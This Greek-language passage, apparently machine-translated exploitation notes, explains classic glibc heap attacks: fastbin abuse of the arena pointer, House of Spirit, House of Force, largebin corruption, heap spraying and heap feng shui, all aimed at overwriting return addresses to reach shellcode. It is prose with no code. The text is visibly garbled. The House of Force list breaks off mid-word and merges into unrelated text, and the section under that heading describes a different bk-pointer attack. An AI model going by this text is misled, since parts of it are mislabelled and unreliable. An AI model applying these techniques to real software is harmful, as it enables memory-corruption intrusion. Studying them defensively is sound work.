Λόγω των μηδενικών του \_DTOR\_END\_ και των λίγων διευθύνσεων στην GOT, καμία από αυτές τις διευθύνσεις δεν είναι κατάλληλες για αντικατάσταση, οπότε ας δούμε πώς να εφαρμόσουμε το fastbin για επίθεση στη στοίβα.

Ένας άλλος τρόπος επίθεσης είναι να ανακατευθύνουμε το **av** προς τη στοίβα.

Αν τροποποιήσουμε το μέγεθος ώστε να είναι 16 αντί για 8 τότε: fastbin\_index() θα μας επιστρέψει fastbins\[0] και μπορούμε να το χρησιμοποιήσουμε για να αντικαταστήσουμε τη στοίβα.

Για να γίνει αυτό, δεν πρέπει να υπάρχει κανένα canary ή περίεργες τιμές στη στοίβα, πρέπει να βρισκόμαστε σε αυτήν: 4bytes μηδενικά + EBP + RET

Τα 4 bytes μηδενικά απαιτούνται για να είναι η **av** σε αυτήν τη διεύθυνση και το πρώτο στοιχείο ενός **av** είναι το mutex που πρέπει να είναι 0.

Το **av->max\_fast** θα είναι το EBP και θα είναι μια τιμή που θα μας επιτρέψει να παρακάμψουμε τους περιορισμούς.

Στο **av->fastbins\[0]** θα αντικατασταθεί με τη διεύθυνση του **p** και θα είναι το RET, έτσι θα πηδήξει στο shellcode.

Επιπλέον, στο **av->system\_mem** (1484bytes πάνω από τη θέση στη στοίβα) θα υπάρχει αρκετό σκουπίδι που θα μας επιτρέψει να παρακάμψουμε τον έλεγχο που πραγματοποιείται.

Επιπλέον, πρέπει να ισχύει ότι το κομμάτι που είναι δίπλα στο απελευθερωμένο πρέπει να είναι μεγαλύτερο από 8 -> Δεδομένου ότι είπαμε ότι το μέγεθος του απελευθερωμένου κομματιού είναι 16, σε αυτό το ψεύτικο κομμάτι απλά πρέπει να βάλουμε ένα μέγεθος μεγαλύτερο από 8 (καθώς επίσης το shellcode θα βρίσκεται στο απελευθερωμένο κομμάτι, θα πρέπει να βάλουμε ένα jmp που θα πέσει σε nops που ακολουθούν μετά το πεδίο size του νέου ψεύτικου κομματιού.

**The House of Spirit**

Σε αυτήν την περίπτωση, αναζητούμε ένα δείκτη σε ένα malloc που μπορεί να τροποποιηθεί από τον επιτιθέμενο (π.χ., ο δείκτης να βρίσκεται στη στοίβα κάτω από ένα πιθανό overflow σε μια μεταβλητή).

Έτσι, θα μπορούσαμε να κάνουμε αυτόν τον δείκτη να δείχνει όπου θέλουμε. Ωστόσο, όχι οποιαδήποτε θέση είναι κατάλληλη, το μέγεθος του Ϩεύτικου κομματιού πρέπει να είναι μικρότερο από το av->max\_fast και πιο συγκεκριμένα ίσο με το μέγεθος που ζητείται σε μια μελλοντική κλήση στο malloc()+8. Γι' αυτό, αν γνωρίζουμε ότι μετά από αυτόν τον ευάλωτο δείκτη καλείται το malloc(40), το μέγεθος του Ϩεύτικου κομματιού πρέπει να είναι ίσο με 48.

Αν για παράδειγμα το πρόγραμμα ρωτούσε τον χρήστη για έναν αριθμό, θα μπορούσαμε να εισάγουμε το 48 και να κατευθύνουμε τον τροποποιήσιμο δείκτη του malloc στα επόμενα 4bytes (που θα μπορούσαν να ανήκουν στο EBP με τύχη, έτσι το 48 μένει πίσω, σαν να ήταν η κεφαλή size). Επιπλέον, η διεύθυνση ptr-4+48 πρέπει να πληροί αρκετές συνθήκες (σε αυτήν την περίπτωση ptr=EBP), δηλαδή, 8 < ptr-4+48 < av->system\_mem.

Σε περίπτωση που αυτό ισχύει, όταν κληθεί το επόμενο malloc που είπαμε ότι είναι malloc(40), θα του ανατεθεί ως διεύθυνση η διεύθυνση του EBP. Σε περίπτωση που ο επιτιθέμενος μπορεί επίσης να ελέγξει τι γράφεται σε αυτό το malloc, μπορεί να αντικαταστήσει τόσο το EBP όσο και το EIP με τη διεύθυνση που επιθυμεί.

Αυτό πιστεύω ότι συμβαίνει επειδή έτσι όταν απελευθερωθεί το free() θα αποθηκεύσει ότι στη διεύθυνση που δείχνει στο EBP της στοίβας υπάρχει ένα κομμάτι με τέλειο μέγεθος για το νέο malloc() που θέλει να κρατήσει, έτσι του αναθέτει αυτήν τη διεύθυνση.

**The House of Force**

Απαιτείται:

* Ένα overflow σε ένα κομμάτι που επιτρέπει την αντικατάσταση του wilderness
* Μια κλήση στο malloc() με το μέγεθος που ορίζεται από τον χρήστη
* Μια κλήση στο malloc() των δεδομένων της οπ
Απαιτούνται δύο δεσμεύσεις malloc, ώστε το πρώτο να μπορεί να υποστεί overflow μετά την απελευθέρωση του δεύτερου και να έχει εισαχθεί στον bin του (δηλαδή να έχει δεσμευτεί ένα malloc μεγαλύτερο από το δεύτερο πριν το overflow).

Το malloc που δεσμεύεται στη διεύθυνση που επιλέγει ο επιτιθέμενος πρέπει να ελέγχεται από τον επιτιθέμενο.

Ο στόχος είναι, αν μπορούμε να προκαλέσουμε ένα overflow σε ένα heap που έχει ήδη ένα τμήμα που έχει απελευθερωθεί και βρίσκεται στον bin του, μπορούμε να τροποποιήσουμε τον δείκτη bk του. Αν τροποποιήσουμε τον δείκτη bk και αυτό το τμήμα γίνει το πρώτο στη λίστα του bin και δεσμευτεί, ο bin θα παραπλανηθεί και θα του λεχθεί ότι το επόμενο τμήμα στη λίστα (το επόμενο που προσφέρεται) βρίσκεται στην ψευδή διεύθυνση που έχουμε ορίσει (π.χ. στο stack ή στο GOT). Έτσι, αν δεσμευτεί ένα άλλο τμήμα και ο επιτιθέμενος έχει δικαιώματα σε αυτό, θα λάβει ένα τμήμα στην επιθυμητή θέση και θα μπορεί να γράψει σε αυτό.

Για να προστατευτεί αυτή η επίθεση, χρησιμοποιείται η συνήθης έλεγχος ότι το τμήμα "δεν" είναι ψευδές: ελέγχεται αν το bck->fd δείχνει στο victim. Αυτό σημαίνει ότι, στην περίπτωσή μας, αν ο δείκτης fd* του ψευδούς τμήματος που δείχνει στο stack δείχνει στο victim. Για να παρακάμψει αυτήν την προστασία, ο επιτιθέμενος θα πρέπει να είναι σε θέση να γράψει κάπως (πιθανότατα μέσω του stack) στη σωστή διεύθυνση της διεύθυνσης του victim. Έτσι, το τμήμα θα φαίνεται ότι είναι αληθινό.

**Διαφθορά LargeBin**

Απαιτούνται τα ίδια προαπαιτούμενα με πριν και κάποια παραπάνω, επιπλέον τα δεσμευμένα τμήματα πρέπει να είναι μεγαλύτερα από 512.

Η επίθεση είναι όπως πριν, δηλαδή πρέπει να τροποποιηθεί ο δείκτης bk και να γίνουν όλες αυτές οι κλήσεις στο malloc(), αλλά πρέπει επίσης να τροποποιηθεί το μέγεθος του τμήματος που τροποποιήθηκε έτσι ώστε αυτό το size - nb να είναι < MINSIZE.

Για παράδειγμα, θα πρέπει να οριστεί το μέγεθος σε 1552 ώστε 1552 - 1544 = 8 < MINSIZE (η αφαίρεση δεν μπορεί να είναι αρνητική επειδή συγκρίνεται με έναν unsigned)

Επιπλέον, έχει εισαχθεί ένα patch για να γίνει ακόμη πιο περίπλοκο.

**Ψεκασμός Heap**

Βασικά αποτελείται από τη δέσμευση της μέγιστης δυνατής μνήμης για heaps και την επικάλυψή τους με ένα στρώμα nops που τελειώνει με μια shellcode. Επιπλέον, χρησιμοποιείται το 0x0c ως στρώμα. Έτσι, θα προσπαθήσει να μεταβεί στη διεύθυνση 0x0c0c0c0c, και έτσι αν κάποια διεύθυνση που θα χρησιμοποιηθεί με αυτό το στρώμα υπεργραφεί, θα μεταβεί εκεί. Βασικά η τακτική είναι να δεσμεύσετε το μέγιστο δυνατό για να δείτε αν υπεργραφεί κάποιος δείκτης και να μεταβείτε στο 0x0c0c0c0c ελπίζοντας ότι εκεί θα υπάρχουν nops.

**Διαμόρφωση Heap Feng Shui**

Αποτελείται από την τσιμεντοποίηση της μνήμης με τη δέσμευση και απελευθέρωση των τμημάτων έτσι ώστε να υπάρχουν δεσμευμένα τμήματα μεταξύ ελεύθερων τμημάτων. Το buffer που θα υπερχειλιστεί θα τοποθετηθεί σε ένα από αυτά τα τμήματα.
